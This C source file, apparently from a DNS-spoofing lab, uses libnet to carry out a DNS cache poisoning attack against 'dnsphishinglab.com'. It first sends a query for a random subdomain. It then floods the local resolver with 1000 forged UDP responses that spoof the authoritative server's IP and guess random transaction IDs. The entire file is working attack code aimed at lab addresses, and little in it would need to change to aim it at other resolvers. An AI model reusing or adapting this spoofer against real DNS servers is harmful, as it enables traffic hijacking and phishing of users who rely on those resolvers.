/*		    GNU GENERAL PUBLIC LICENSE
		       Version 2, June 1991
 Copyright (C) 1989, 1991 Free Software Foundation, Inc.,
 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.
*/
#include <libnet.h>
#include <unistd.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
    int c;
    u_char *cp;
    libnet_t *l;
    libnet_ptag_t t;
    char errbuf[LIBNET_ERRBUF_SIZE];
    char eth_file[FILENAME_MAX] = "";
    char ip_file[FILENAME_MAX] = "";
    char tcp_file[FILENAME_MAX] = "";
    char payload_file[FILENAME_MAX] = "";
 
    
    int x;
    int y = 0;
    int udp_src_port = 1;       /* UDP source port */
    int udp_des_port = 1;       /* UDP dest port */
    int z;
    int i;
    int payload_filesize = 0;
    u_char eth_saddr[6];	/* NULL Ethernet saddr */
    u_char eth_daddr[6]; 	/* NULL Ethernet daddr */
    u_char eth_naddr[6]; 	/* NULL Ethernet daddr */
    u_char eth_proto[60];       /* Ethernet protocal */
    u_long eth_pktcount;        /* How many packets to send */
    long nap_time;              /* How long to sleep */
    u_char ip_proto[40];
    u_char spa[4]={0x0, 0x0, 0x0, 0x0};
    u_char tpa[4]={0x0, 0x0, 0x0, 0x0};
    u_char *device = NULL;
    u_char i_ttos_val = 0;	/* final or'd value for ip tos */
    u_char i_ttl;		/* IP TTL */
    u_short e_proto_val = 0;    /* final resulting value for eth_proto */
    u_short ip_proto_val = 0;   /* final resulting value for ip_proto */

    int t_src_port;     /* TCP source port */
    int t_des_port;     /* TCP dest port */
    int t_win;      /* TCP window size */
    int t_urgent;       /* TCP urgent data pointer */
    int i_id;       /* IP id */
    int i_frag;     /* IP frag */
    u_short head_type;          /* TCP or UDP */

    u_long t_ack;       /* TCP ack number */
    u_long t_seq;       /* TCP sequence number */
    u_long i_des_addr;      /* IP dest addr */
    u_long i_src_addr;      /* IP source addr */
    u_char t_control_val = 0;   /* final or'd value for tcp control */
    u_char i_ttos[90];      /* IP TOS string */
    u_char t_control[65];   /* TCP control string */
	
	char target_domain[] = "dnsphishinglab.com";	// Attacked domain
    char attack_dns_ip[] = "192.168.249.129";	// Local DNS
    char user_ip[] = "192.168.249.130";		// User IP
    char dns2_server[] = "192.168.249.132";	// DNS 2 IP
    char dev[] = "eth0"; //interface of the host-only network
    u_long i_attack_dns_ip;
    u_long i_user_ip;
    u_long i_dns2_server;
    char spoof_host[50];
    char *loc_payload;
	
int
main(int argc, char *argv[])
{
    /*
     *  Initialize the library.  Root priviledges are required.
     */
    l = libnet_init(
            LIBNET_LINK,                             /* injection type */
			dev,                                /* network interface eth0, eth1, etc. NULL is default.*/
            errbuf);                                 /* error buffer */
    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s", errbuf);
        exit(EXIT_FAILURE); 
    }
    i_attack_dns_ip = libnet_name2addr4(l, attack_dns_ip, LIBNET_RESOLVE);
    i_user_ip = libnet_name2addr4(l, user_ip, LIBNET_RESOLVE);
    i_dns2_server = libnet_name2addr4(l, dns2_server, LIBNET_RESOLVE);
    srand((int)time(0));	// initialize random seed

    while ((c = getopt (argc, argv, "p:t:i:e:")) != EOF)
    {
        switch (c)
        {
            case 'p':
                strcpy(payload_file, optarg);
                break;
            case 't':
                strcpy(tcp_file, optarg);
                break;
            case 'i':
                strcpy(ip_file, optarg);
                break;
            case 'e':
                strcpy(eth_file, optarg);
                break;
            default:
                break;
        }
    }

    if (optind != 9)
    {    
        usage();
        exit(0);
    }
        
    load_ethernet();
    load_tcp_udp();
    load_ip();
    convert_proto();



	int randomNumber = (rand()%1000);
	while (randomNumber<100) randomNumber*=10;
    sprintf(spoof_host, ".Spoof-%d.%s", randomNumber,target_domain);
    printf("\Spoof Domain %s \n",spoof_host);
    
	unsigned int lengthHost = (unsigned)strlen(spoof_host);
    
    int incHost=0;
    while (lengthHost>0) {
        if (spoof_host[lengthHost-1]=='.') {
            spoof_host[lengthHost-1]=incHost;            
            incHost=0;
        }
        else {
            incHost++;
        }
        lengthHost--;
    }  
	
	
    load_payload_request();
	    
	    t = libnet_build_udp(
		    t_src_port,                                /* source port */
		    t_des_port,                                /* destination port */
		    LIBNET_UDP_H + payload_filesize,           /* packet length */
		    0,                                         /* checksum */
		    loc_payload,                          /* payload */
		    payload_filesize,                          /* payload size */
		    l,                                         /* libnet handle */
		    0);                                        /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
		goto bad;
	    }
        
	    t = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_UDP_H + payload_filesize,          /* length */
		i_ttos_val,                         /* TOS */
		i_id,                                                  /* IP ID */
		i_frag,                                                /* IP Frag */
		i_ttl,                                                 /* TTL */
		IPPROTO_UDP,                                          /* protocol */
		0,                                                     /* checksum */
		i_src_addr,                                            /* source IP */
		i_des_addr,                                            /* destination IP */
		NULL,                                                  /* payload */
		0,                                                     /* payload size */
		l,                                                     /* libnet handle */
		0);                                                    /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	    t = libnet_build_ethernet(
		eth_daddr,                                   /* ethernet destination */
		eth_saddr,                                   /* ethernet source */
		ETHERTYPE_IP,                                 /* protocol type */
		NULL,                                        /* payload */
		0,                                           /* payload size */
		l,                                           /* libnet handle */
		0);                                          /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	     
        c = libnet_write(l);
        free(loc_payload);
    libnet_destroy(l);
    for (i=0;i<1000;i++) {	// Send 1000 spoofed packets.
        l = libnet_init(
            LIBNET_LINK,                             /* injection type */
	    dev,                                /* network interface eth0, eth1, etc. NULL is default.*/
            errbuf);                                 /* error buffer */
        load_payload_attack();
	    // always builds UDP
	    t = libnet_build_udp(
		    53,                                /* source port */
		    33333,                                /* destination port */
		    LIBNET_UDP_H + payload_filesize,           /* packet length */
		    0,                                         /* checksum */
		    loc_payload,                          /* payload */
		    payload_filesize,                          /* payload size */
		    l,                                         /* libnet handle */
		    0);                                        /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	    t = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_UDP_H + payload_filesize,          /* length */
		0,                         /* TOS */
		12345,                                                  /* IP ID */
		IP_DF,                                                /* IP Frag */
		255,                                                 /* TTL */
		IPPROTO_UDP,                                          /* protocol */
		0,                                                     /* checksum */
		i_dns2_server,                                            /* source IP */
		i_attack_dns_ip,                                            /* destination IP */
		NULL,                                                  /* payload */
		0,                                                     /* payload size */
		l,                                                     /* libnet handle */
		0);                                                    /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	    t = libnet_build_ethernet(
		eth_daddr,                                   /* ethernet destination */
		eth_naddr,                                   /* ethernet source */
		ETHERTYPE_IP,                                 /* protocol type */
		NULL,                                        /* payload */
		0,                                           /* payload size */
		l,                                           /* libnet handle */
		0);                                          /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	     /*	
	     *  Write it to the wire.
	     */
        c = libnet_write(l);
        free(loc_payload);
        libnet_destroy(l);
    }
    l = libnet_init(
            LIBNET_LINK,                             /* injection type */
	    dev,                                /* network interface eth0, eth1, etc. NULL is default.*/
            errbuf);                                 /* error buffer */

printf("1000 Spoofed Packet Send.",eth_pktcount,c);  /* tell them what we just did */
    
    libnet_destroy(l);
    return (0);
bad:
    libnet_destroy(l);
    return (EXIT_FAILURE);
	    
}

usage()
{
    fprintf(stderr, "pacgen 1.10 by Bo Cato. Protected under GPL.\nusage: pacgen -p <payload file> -t <TCP/UDP file> -i <IP file> -e <Ethernet file>\n");
}


load_ethernet()
{
    FILE *infile;

    char s_read[40];
    char d_read[40];
    char n_read[40];
    char p_read[60];
    char count_line[40];

    infile = fopen(eth_file, "r");

    fgets(s_read, 40, infile);         /*read the source mac*/
    fgets(d_read, 40, infile);         /*read the destination mac*/
    fgets(n_read, 40, infile);          /*read the dns server 2 mac*/
    fgets(p_read, 60, infile);         /*read the desired protocal*/
    fgets(count_line, 40, infile);     /*read how many packets to send*/

    sscanf(s_read, "saddr,%x, %x, %x, %x, %x, %x", &eth_saddr[0], &eth_saddr[1], &eth_saddr[2], &eth_saddr[3], &eth_saddr[4], &eth_saddr[5]);
    sscanf(d_read, "daddr,%x, %x, %x, %x, %x, %x", &eth_daddr[0], &eth_daddr[1], &eth_daddr[2], &eth_daddr[3], &eth_daddr[4], &eth_daddr[5]);
    sscanf(n_read, "naddr,%x, %x, %x, %x, %x, %x", &eth_naddr[0], &eth_naddr[1], &eth_naddr[2], &eth_naddr[3], &eth_naddr[4], &eth_naddr[5]);
    sscanf(p_read, "proto,%s", &eth_proto);
    sscanf(count_line, "pktcount,%d", &eth_pktcount);

    fclose(infile);
}

    /* load_tcp_udp: load TCP or UDP data file into the variables */
load_tcp_udp()
{
    FILE *infile;

    char sport_line[20] = "";
    char dport_line[20] = "";
    char seq_line[20] = "";
    char ack_line[20] = "";
    char control_line[65] = "";
    char win_line[20] = "";
    char urg_line[20] = "";

    infile = fopen(tcp_file, "r");

    fgets(sport_line, 15, infile);  /*read the source port*/
    fgets(dport_line, 15, infile);  /*read the dest port*/
    fgets(win_line, 12, infile);    /*read the win num*/
    fgets(urg_line, 12, infile);    /*read the urg id*/
    fgets(seq_line, 13, infile);    /*read the seq num*/
    fgets(ack_line, 13, infile);    /*read the ack id*/
    fgets(control_line, 63, infile);    /*read the control flags*/

    /* parse the strings and throw the values into the variable */

    sscanf(sport_line, "sport,%d", &t_src_port);
    sscanf(sport_line, "sport,%d", &udp_src_port);
    sscanf(dport_line, "dport,%d", &t_des_port);
    sscanf(dport_line, "dport,%d", &udp_des_port);
    sscanf(win_line, "win,%d", &t_win);
    sscanf(urg_line, "urg,%d", &t_urgent);
    sscanf(seq_line, "seq,%ld", &t_seq);
    sscanf(ack_line, "ack,%ld", &t_ack);
    sscanf(control_line, "control,%[^!]", &t_control);

    fclose(infile); /*close the file*/
}

    /* load_ip: load IP data file into memory */
load_ip()
{
    FILE *infile;

    char proto_line[40] = "";
    char id_line[40] = "";
    char frag_line[40] = "";
    char ttl_line[40] = "";
    char saddr_line[40] = "";
    char daddr_line[40] = "";
    char tos_line[90] = "";
    char z_zsaddr[40] = "";
    char z_zdaddr[40] = "";
    char inter_line[15]="";

    infile = fopen(ip_file, "r");

    fgets(id_line, 11, infile);     /* this stuff should be obvious if you read the above subroutine */
    fgets(frag_line, 13, infile);   /* see RFC 791 for details */
    fgets(ttl_line, 10, infile);
    fgets(saddr_line, 24, infile);
    fgets(daddr_line, 24, infile);
    fgets(proto_line, 40, infile);
    fgets(inter_line, 15, infile);
    fgets(tos_line, 78, infile);
    
    sscanf(id_line, "id,%d", &i_id);
    sscanf(frag_line, "frag,%d", &i_frag);
    sscanf(ttl_line, "ttl,%d", &i_ttl);
    sscanf(saddr_line, "saddr,%s", &z_zsaddr);
    sscanf(daddr_line, "daddr,%s", &z_zdaddr);
    sscanf(proto_line, "proto,%s", &ip_proto);
    sscanf(inter_line, "interval,%d", &nap_time);
    sscanf(tos_line, "tos,%[^!]", &i_ttos);

    i_src_addr = libnet_name2addr4(l, z_zsaddr, LIBNET_RESOLVE);
    i_des_addr = libnet_name2addr4(l, z_zdaddr, LIBNET_RESOLVE);
    
    fclose(infile);
}

convert_proto()
{

/* Need to add more Ethernet and IP protocals to choose from */

    if(strstr(eth_proto, "arp") != NULL)
      e_proto_val = e_proto_val | ETHERTYPE_ARP;

    if(strstr(eth_proto, "ip") != NULL)
      e_proto_val = e_proto_val | ETHERTYPE_IP;

    if(strstr(ip_proto, "tcp") != NULL)
        ip_proto_val = ip_proto_val | IPPROTO_TCP;

    if(strstr(ip_proto, "udp") != NULL)
      ip_proto_val = ip_proto_val | IPPROTO_UDP;
}

    /* convert_toscontrol:  or flags in strings to make u_chars */
convert_toscontrol()
{
    if(strstr(t_control, "th_urg") != NULL)
        t_control_val = t_control_val | TH_URG;

    if(strstr(t_control, "th_ack") != NULL)
        t_control_val = t_control_val | TH_ACK;

    if(strstr(t_control, "th_psh") != NULL)
        t_control_val = t_control_val | TH_PUSH;

    if(strstr(t_control, "th_rst") != NULL)
        t_control_val = t_control_val | TH_RST;

    if(strstr(t_control, "th_syn") != NULL)
        t_control_val = t_control_val | TH_SYN;

    if(strstr(t_control, "th_fin") != NULL)
        t_control_val = t_control_val | TH_FIN;

    if(strstr(i_ttos, "iptos_lowdelay") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_LOWDELAY;

    if(strstr(i_ttos, "iptos_throughput") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_THROUGHPUT;

    if(strstr(i_ttos, "iptos_reliability") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_RELIABILITY;

    if(strstr(i_ttos, "iptos_mincost") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_MINCOST;
}

load_payload_request()
{
    FILE *infile;
    struct stat statbuffer;
    int index = 0;
    int increment = 0;
    int count = 0;
    unsigned int length = (unsigned)strlen(spoof_host);
    char payload_request_file[] = "payload_query";
    stat(payload_request_file, &statbuffer);
    payload_filesize = statbuffer.st_size+length;
    loc_payload = (char *)malloc(payload_filesize * sizeof(char));
    if (loc_payload == 0)
    {
        printf("Memory Allocation for payload failed.\n");
        exit(0); 
    }
    
    infile = fopen(payload_request_file, "r");	
    
    while((count = getc(infile)) != EOF)
    {
        if (index==12) { 
            for (increment=0;increment<length;increment++) {
                *(loc_payload + index + increment) = spoof_host[increment]; 
            }
            index+=length;
        }
        *(loc_payload + index) = count;
        index++;
    }
    fclose(infile);
    
}

load_payload_attack()
{
    
    FILE *infile;
    struct stat statbuffer;
    int index = 2;
    int increment = 0;
    int count = 0;
    unsigned int len = (unsigned)strlen(spoof_host);
    char payload_attack_file[] = "payload_attack";
    int transID[] = {rand()%256,rand()%256}; 
    stat(payload_attack_file, &statbuffer);
    payload_filesize = statbuffer.st_size+len+2;
    loc_payload = (char *)malloc(payload_filesize * sizeof(char));
    if (loc_payload == 0)
    {
        printf("Memory Allocation for payload failed.\n");
        exit(0); 
    }
    *loc_payload = transID[0];
    *(loc_payload+1) = transID[1];
    
    infile = fopen(payload_attack_file, "r");	
    
    while((count = getc(infile)) != EOF)
    {
        if (index==12) {
            for (increment=0;increment<len;increment++) {
                *(loc_payload + index + increment) = spoof_host[increment];
            }
            index+=len;
        }
        *(loc_payload + index) = count;
        index++;
    }
    fclose(infile);
}

/* EOF */
